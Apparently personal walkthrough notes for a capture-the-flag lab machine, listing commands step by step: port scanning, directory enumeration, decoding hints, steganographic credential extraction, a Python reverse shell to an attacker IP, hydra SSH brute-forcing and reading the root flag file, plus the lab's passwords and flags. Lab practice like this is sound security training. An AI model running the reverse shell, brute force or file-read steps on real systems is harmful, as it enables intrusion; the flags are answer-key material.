```bash
nmap -sSV -O -Pn 0.0.0.0
```

![[Captura desde 2024-09-18 11-48-16.png]]

```bash
curl http://0.0.0.0:22
```

![[Captura desde 2024-09-18 11-49-36.png]]

```bash
curl http://0.0.0.0:22/recovery.php
```

![[Captura desde 2024-09-18 11-51-04.png]]

```bash
dirsearch -u http://0.0.0.0:22
```

![[Captura desde 2024-09-18 11-54-23.png]]

```bash
dirsearch -u http://0.0.0.0:22/assets/
```

![[Captura desde 2024-09-18 11-55-04.png]]

```bash
UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==
```

![[Captura desde 2024-09-18 11-59-56.png]]

password: `u?WtKSraq`

```bash
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
```

![[Captura desde 2024-09-18 11-57-50.png]]

hint: `bit.ly/2TvYQ2S`

![[Captura desde 2024-09-18 13-37-38.png]]

```bash
wget http://0.0.0.0:22/assets/stego.jpg
```

![[Captura desde 2024-09-18 13-17-32.png]]

```bash
wget http://0.0.0.0:22/assets/header.jpg
```

![[Captura desde 2024-09-18 17-35-16.png]]

```bash
steghide extract -sf stego.jpg -p u?WtKSraq
```

![[Captura desde 2024-09-18 13-46-27.png]]

```bash
steghide extract -sf header.jpg -p u?WtKSraq
```

![[Captura desde 2024-09-18 17-32-15.png]]

Username: `jackinthebox`
Password: `TplFxiSHjY`

```bash
curl -X POST http://10.10.89.103:22/recovery.php -d "user=jackinthebox&pass=TplFxiSHjY" -v -L
```

![[Captura desde 2024-09-18 20-56-08.png]]

Postman to access web page

![[Captura desde 2024-09-18 20-58-18.png]]

reverse shell

```python
export RHOST="10.9.195.83";export RPORT=8888;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

![[Captura desde 2024-09-18 21-03-58.png]]

![[Captura desde 2024-09-18 21-02-57.png]]

username: `jack`

Save password list to `password.txt`

```bash
hydra -l jack -P password.txt -s 80 10.10.89.103 ssh -v -t 4
```

![[Captura desde 2024-09-18 21-09-25.png]]

username: `jack`
password: `ITMJpGGIqg1jn?>@`

![[Captura desde 2024-09-18 22-21-31.png]]

![[Captura desde 2024-09-18 22-21-40.png]]

**flag: `securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`**

```bash
ssh -p 80 jack@0.0.0.0
```

```bash
LFILE=/root/root.txt
strings "$LFILE"
```

![[Captura desde 2024-09-18 22-04-42.png]]

**flag: `securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}`**